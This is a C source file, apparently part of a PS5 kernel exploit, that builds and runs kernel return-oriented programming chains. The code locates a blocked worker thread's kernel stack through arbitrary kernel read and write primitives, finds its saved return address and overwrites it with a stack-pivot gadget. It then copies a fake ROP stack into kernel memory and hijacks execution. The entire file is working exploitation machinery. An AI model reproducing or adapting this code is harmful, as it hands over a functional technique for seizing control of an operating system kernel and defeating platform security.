#include <errno.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <unistd.h>

#include <ps5/kernel.h>

#include "debug_log.h"
#include "kdlsym.h"
#include "krop.h"
#include "mirror.h"
#include "paging.h"
#include "util.h"

#define WORKER_THREAD_TAGGED_SIZE                   0x03FE

int sceKernelSleep(int);

void pthread_set_name_np(pthread_t, const char *);

void *krop_worker_func(void *arg)
{
    struct krop_manage *krop;
    char scratch_buf[0x1000];

    krop = (struct krop_manage *) arg;
    if (krop == NULL) {
        return NULL;
    }

    // Pin to a core
    pin_to_first_available_core();
    krop->core = get_cpu_core();

    SOCK_LOG("[+] KROP: krop_worker thread entered (core=0x%x), reading from %d\n", get_cpu_core(), krop->pipe_fds[1]);

    // Do a blocking read and store arguments
    krop->tag1 = (uint64_t) &scratch_buf;
    krop->tag2 = WORKER_THREAD_TAGGED_SIZE;
    read(krop->pipe_fds[1], &scratch_buf, krop->tag2);

    krop->done = 1;
    SOCK_LOG("[+] KROP: krop_worker thread exiting\n");
    return NULL;
}

uint64_t find_thread_kstack(char *name)
{
    pid_t pid;
    uint64_t proc;
    uint64_t proc_p_thread;
    uint64_t next_thread;
    uint64_t thr_stack;
    char thr_name[0x100];

    // Get process pid
    pid = getpid();

    // Get proc
    proc = kernel_get_proc(pid);
    //SOCK_LOG("create_krop_chain: proc=0x%lx\n", proc);
    if (proc == 0) {
        //SOCK_LOG("create_krop_chain: proc is null\n");
        return 0;
    }

    // Get thread
    kernel_copyout(proc + 0x10, &proc_p_thread, sizeof(proc_p_thread));
    thr_stack = 0;

    for (;;) {
        //SOCK_LOG("create_krop_chain: thread=0x%lx\n", proc_p_thread);

        kernel_copyout(proc_p_thread + 0x010, &next_thread, sizeof(next_thread));
        kernel_copyout(proc_p_thread + 0x294, &thr_name, sizeof(thr_name));
        //SOCK_LOG("create_krop_chain:   checking %s (next thread=0x%lx)\n", thr_name, next_thread);

        if (strncmp(thr_name, name, sizeof(thr_name)) == 0) {
            kernel_copyout(proc_p_thread + 0x470, &thr_stack, sizeof(thr_stack));
            break;
        }

        if (next_thread == 0) {
            break;
        }

        proc_p_thread = next_thread;
    }

    //SOCK_LOG("create_krop_chain: found stack=0x%lx\n", thr_stack);
    return thr_stack;
}

struct krop_manage *create_krop_chain()
{
    struct krop_manage *krop;
    
    // Create a krop object
    krop = (struct krop_manage *) malloc(sizeof(struct krop_manage));
    //SOCK_LOG("create_krop_chain: krop=%p\n", krop);
    if (krop == NULL) {
        return NULL;
    }

    krop->done = 0;
    krop->core = -1;

    // Create a pipe pair to block the worker thread
    pipe2((int *) &krop->pipe_fds, 0);
    //SOCK_LOG("create_krop_chain: %d <-> %d\n", krop->pipe_fds[0], krop->pipe_fds[1]);

    // Create and run the thread to block
    pthread_create(&krop->thread, NULL, krop_worker_func, (void *) krop);
    pthread_set_name_np(krop->thread, "krop_worker");

    // Find the thread
    krop->thread_kstack = find_thread_kstack("krop_worker");

    // Wait a few seconds for thread to block
    sceKernelSleep(2);

    // Find the return address target (adjacent to two arguments)
    uint64_t stack_val;
    krop->kstack_ret_addr_offset = 0;
    for (int i = 0x3000; i < 0x4000; i += sizeof(uint64_t)) {
        kernel_copyout(krop->thread_kstack + i + 0x00, &stack_val, sizeof(stack_val));

        if ((stack_val >> 32) == 0xFFFFFFFF) {
            kernel_copyout(krop->thread_kstack + i + 0x08, &stack_val, sizeof(stack_val));
            if (stack_val == krop->tag1) {
                kernel_copyout(krop->thread_kstack + i + 0x10, &stack_val, sizeof(stack_val));
                if (stack_val == krop->tag2) {
                    //SOCK_LOG("create_krop_chain: found target return addr @ offset=0x%x\n", i);
                    krop->kstack_ret_addr_offset = i;
                    break;
                }
            }
        }
    }

    if (krop->kstack_ret_addr_offset == 0) {
        SOCK_LOG("create_krop_chain: return offset is zero, something's wrong\n");
    }

    // Back up original return address and argument values
    kernel_copyout(krop->thread_kstack + krop->kstack_ret_addr_offset, &stack_val, sizeof(stack_val));
    //SOCK_LOG("create_krop_chain: return addr = 0x%lx\n", stack_val);
    krop->kstack_orig_ret_addr     = stack_val;

    kernel_copyout(krop->thread_kstack + krop->kstack_ret_addr_offset + 0x8, &stack_val, sizeof(stack_val));
    krop->kstack_orig_arg          = stack_val;

    // +0x1000 is safely past with the syscalls in-play
    krop->kstack_fake_stack_offset = 0x1000;
    krop->fake_stack_cur = (char *) &krop->fake_stack;

    return krop;
}

void krop_push(struct krop_manage *krop, uint64_t val)
{
    *(uint64_t *) (krop->fake_stack_cur) = val;
    krop->fake_stack_cur += sizeof(val);
}

void krop_push_write8(struct krop_manage *krop, uint64_t dest, uint64_t val)
{
    krop_push(krop, KROP_GADGET_POP_RDI);
    krop_push(krop, dest);
    krop_push(krop, KROP_GADGET_POP_RSI);
    krop_push(krop, val);
    krop_push(krop, KROP_GADGET_MOV_QWORD_PTR_RDI_RSI);
}

void krop_push_exit(struct krop_manage *krop)
{
    // Write back original return addr where we hijacked stack pointer
    krop_push_write8(
        krop, 
        krop->thread_kstack + krop->kstack_ret_addr_offset, 
        krop->kstack_orig_ret_addr
    );
    krop_push_write8(
        krop, 
        krop->thread_kstack + krop->kstack_ret_addr_offset + 0x8, 
        krop->kstack_orig_arg
    );

    // Restore r12
    // krop_push(krop, KROP_GADGET_POP_R12);
    // krop_push(krop, 1337);

    // Reset stack pointer
    krop_push(krop, KROP_GADGET_POP_RSP);
    krop_push(krop, krop->thread_kstack + krop->kstack_ret_addr_offset);
}

void krop_push_infloop(struct krop_manage *krop)
{
    SOCK_LOG("krop_push_infloop: WE ARE HANGING THE KROP THREAD, WARNING\n");
    krop_push(krop, KROP_GADGET_INFLOOP);
}

void krop_copy_kernel(struct krop_manage *krop)
{
    uint64_t fake_rsp;

    fake_rsp = krop->thread_kstack + krop->kstack_fake_stack_offset;
    kernel_copyin(&krop->fake_stack, fake_rsp, sizeof(krop->fake_stack));
}

void krop_run(struct krop_manage *krop)
{
    uint64_t fake_rsp;
    uint64_t fake_ret;
    char scratch_buf[0x1000];

    krop_copy_kernel(krop);

    // Overwrite target return address with stack pivot and arg with fake RSP
    fake_rsp = krop->thread_kstack + krop->kstack_fake_stack_offset;
    kernel_copyin(&fake_rsp, krop->thread_kstack + krop->kstack_ret_addr_offset + 0x8, sizeof(fake_rsp));

    fake_ret = KROP_GADGET_POP_RSP;
    kernel_copyin(&fake_ret, krop->thread_kstack + krop->kstack_ret_addr_offset, sizeof(fake_ret));

    // Unblock the worker thread by writing expected size to pipe
    write(krop->pipe_fds[0], &scratch_buf, krop->tag2);

    while (krop->done == 0);
}

void krop_dump_fake_stack(struct krop_manage *krop, int in_kernel)
{
    char dump_stack_buf[0x400];

    SOCK_LOG("krop_dump_fake_stack: dumping fake stack (in kernel = %d)\n", in_kernel);

    if (in_kernel == 0) {
        for (int i = 0; i < 0x1000; i += 0x400) {
            DumpHex(&krop->fake_stack[i], 0x400);
        }
    } else {
        for (int i = 0; i < 0x1000; i += 0x400) {
            kernel_copyout(krop->thread_kstack + krop->kstack_fake_stack_offset + i, &dump_stack_buf, 0x400);
            DumpHex(dump_stack_buf, 0x400);
        }
    }
}

void krop_dump_real_stack(struct krop_manage *krop)
{
    char dump_stack_buf[0x400];

    SOCK_LOG("krop_dump_real_stack: dumping actual stack (+0x3000 to +0x4000)\n");
    if (krop->thread_kstack != 0) {
        for (int i = 0; i < 0x1000; i += 0x400) {
            kernel_copyout(krop->thread_kstack + 0x3000 + i, &dump_stack_buf, 0x400);
            DumpHex(dump_stack_buf, 0x400);
        }
    }
}
